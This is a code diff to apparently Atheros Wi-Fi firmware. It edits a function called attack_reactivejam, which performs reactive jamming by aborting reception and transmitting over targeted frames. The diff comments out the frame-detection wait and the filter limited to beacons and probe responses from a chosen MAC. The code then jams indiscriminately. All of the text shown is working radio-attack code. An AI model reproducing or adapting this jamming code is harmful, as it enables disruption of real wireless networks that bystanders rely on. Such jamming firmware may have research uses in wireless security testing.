@@ -298,7 +298,7 @@ int attack_reactivejam(struct ath_softc_tgt *sc, unsigned char source[6],
 	//dump_rx_macbufs(ah);
 	//dump_rx_tailq(sc);
 	printk(">reactjam\n");
-
+	A_PRINTF(">reactjam\n\r");
 	// disable (simulated) interrupts and configure radio
 	ah->ah_setInterrupts(sc->sc_ah, 0);
 
@@ -369,9 +369,9 @@ int attack_reactivejam(struct ath_softc_tgt *sc, unsigned char source[6],
 		txads->ds_txstatus9 &= ~AR_TxDone;
 
 		// Wait until frame has been detected, exit if it takes too long
-		while (elapsed < msecs && buff[15] == 0xF1) {
-			prev = update_elapsed(prev, freq, &elapsed);
-		}
+//		while (elapsed < msecs && buff[15] == 0xF1) {
+//			prev = update_elapsed(prev, freq, &elapsed);
+//		}
 
 		// Exit on timeout, otherwise we recieved something
 		if (elapsed >= msecs) break;
@@ -383,9 +383,9 @@ int attack_reactivejam(struct ath_softc_tgt *sc, unsigned char source[6],
 		// 1. Jam beacons and probe responses (0x80 and 0x50, respectively)
 		// 2. - If source is a multicast MAC address, then jam *all* transmitters
 		//    - Otherwise jam only the transmitter with MAC address `source`
-		if ( (buff[0] == 0x80 || buff[0] == 0x50)
-		     && ((source[0] & 1) || A_MEMCMP(source, buff + 10, 6) == 0) )
-		{
+//		if ( (buff[0] == 0x80 || buff[0] == 0x50)
+//		     && ((source[0] & 1) || A_MEMCMP(source, buff + 10, 6) == 0) )
+//		{
 			// Abort Rx
 			*((a_uint32_t *)(WLAN_BASE_ADDRESS + AR_DIAG_SW)) |= AR_DIAG_RX_ABORT;
 
@@ -399,9 +399,9 @@ int attack_reactivejam(struct ath_softc_tgt *sc, unsigned char source[6],
 			// No need to wait until AR_TxDone is set in txads->ds_txstatus9, we simple wait
 			// until we receive the next frame.
 			printk("+");
-		} else {
-			printk("-");
-		}
+//		} else {
+//			printk("-");
+//		}
 
 		// update elapsed time
 		prev = update_elapsed(prev, freq, &elapsed);
